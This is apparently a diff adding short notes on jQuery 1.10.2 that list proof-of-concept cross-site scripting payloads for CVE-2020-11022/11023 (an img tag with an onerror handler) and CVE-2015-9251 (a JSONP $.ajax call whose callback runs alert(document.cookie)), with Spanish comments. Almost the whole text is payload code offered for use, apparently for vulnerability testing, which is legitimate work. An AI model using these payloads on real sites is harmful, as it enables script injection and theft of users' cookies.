@@ -1,0 +1,17 @@
+jquery 1.10.2
+[CVE-2020-11022 / CVE-2020-11023]
+<img alt="<x" title="/><img src=x onerror=alert(1)>">
+
+
+[CVE-2015-9251]
+<script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
+<script>
+  // Función que simula una solicitud a un servidor vulnerable
+  $.ajax({
+    url: "https://example.com/api?callback=alert(document.cookie)",
+    dataType: "jsonp", // JSONP permite la ejecución de código en JSONP callbacks
+    success: function(response) {
+      console.log(response);
+    }
+  });
+</script>
